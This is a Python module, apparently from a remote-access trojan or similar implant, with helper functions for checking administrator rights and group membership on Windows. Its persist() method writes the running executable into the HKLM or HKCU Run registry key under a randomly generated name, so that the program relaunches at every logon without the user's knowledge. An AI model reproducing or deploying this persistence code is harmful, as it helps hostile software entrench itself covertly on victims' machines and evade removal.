import os
import ctypes
from execute import execute
from common import *

class Miscellaneous:
	"""
	Miscellaneous functions that don't fit into any other category.
	"""
	def __init__(self):
		self.shell = None
		
	def isadmin(self):
		if os.name == "nt": return ctypes.windll.shell32.IsUserAnAdmin() != 0
		else: return os.geteuid() == 0
		
	def ASCIIfy(self, string):
		return ''.join([i if ord(i) < 128 else '' for i in string])
		
	@windows_only
	def is_user_in_group(self, group, member):
		members = win32net.NetLocalGroupGetMembers(None, group, 1)
		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
		return False
	 
	@windows_only
	def name_of_admin_group(self):
		for line in execute.execute_shell_command("whoami /groups").splitlines():
			if "S-1-5-32-544" in line: # S-1-5-32-544 is a well-known identifier for the admin group
				return line.split()[0].split("\\")[1]
				
	@windows_only
	def persist(self):
		random_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
		if self.isadmin():
			retval = subprocess.Popen("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
			retval.communicate()

			if retval.returncode == 0:
				return "Succesfully added file to registry for local machine."
		else:
			retval = subprocess.Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
			retval.communicate()
			if retval.returncode == 0:
				return "Succesfully added file to current user's registry."
				
		return "Failed to add file to registry."
		
misc = Miscellaneous()